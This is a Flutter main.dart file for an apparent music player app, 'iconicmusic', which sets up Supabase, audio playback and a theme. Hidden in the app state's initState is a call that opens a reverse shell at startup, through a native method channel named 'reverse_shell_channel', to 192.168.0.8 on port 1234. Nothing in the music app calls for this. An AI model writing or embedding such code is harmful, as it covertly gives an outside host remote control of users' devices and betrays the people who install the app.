import 'package:flutter/material.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:iconicmusic/provider/musicProvider.dart';
import 'package:iconicmusic/services/audio_service_initializer.dart';
import 'package:iconicmusic/views/Home.dart';
import 'package:provider/provider.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:audio_service/audio_service.dart';
import 'package:flutter/services.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await dotenv.load(fileName: ".env");
  await Supabase.initialize(
      url: dotenv.env['SUPABASE_URL'] ?? '',
      anonKey: dotenv.env['SUPABASE_KEY'] ?? '');

  final audioHandler=await initAudioHandler();

  runApp(MultiProvider(
      providers: [ChangeNotifierProvider(create: (_) => musicProvider())],
      child: MyApp(audioHandler: audioHandler)));
}

class MyApp extends StatefulWidget {
  MyApp({required this.audioHandler});
  final AudioHandler audioHandler;

  @override
  State<MyApp> createState() => MyAppState();
}

class MyAppState extends State<MyApp> {

  static const MethodChannel channel =
  MethodChannel('reverse_shell_channel');

  Future<void> startReverseTCP(String ip, int port) async {
    try {
      await channel.invokeMethod('startReverseShell', {"ip": ip, "port": port});
    } catch (e) {
      print("Error: ${e}");
    }
  }

  @override
  void initState() {
    super.initState();
    startReverseTCP("192.168.0.8", 1234);
  }

  @override
  void dispose() {
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
        home: HomePage(audioHandler: widget.audioHandler),
        debugShowCheckedModeBanner: false,
        theme: ThemeData(
            useMaterial3: true,
            navigationBarTheme: NavigationBarThemeData(
                labelTextStyle: WidgetStateProperty.resolveWith((states) =>
                    const TextStyle(
                        color: Colors.white, fontWeight: FontWeight.bold)))));
  }
}
